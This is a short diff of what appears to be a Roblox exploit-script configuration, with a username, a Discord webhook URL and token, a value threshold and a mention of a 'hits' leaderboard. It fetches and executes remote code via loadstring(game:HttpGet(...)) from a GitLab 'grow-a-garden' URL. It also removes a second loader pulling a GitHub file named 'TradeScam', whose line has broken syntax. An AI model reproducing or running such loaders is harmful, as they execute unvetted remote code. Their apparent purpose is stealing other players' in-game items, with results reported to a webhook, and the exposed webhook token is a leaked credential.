@@ -1,9 +1,5 @@
 Username = "Player_Slayeruser"
 Webhook = "https://discord.com/api/webhooks/1401247724476563526/aAiQl-BOJhQHYsTjdojA6CDppzGFQKnBIxtkBZQ96nP6tQIWDEl-3YWJrJlu6QdcX5dg"
 MinimumValue = 1
-DiscordID = "Your discord user id" -- optional if you wanna be in hits lb
 
 loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BarryX2008/TradeScam/refs/heads/main/TradeScam"))()"))()
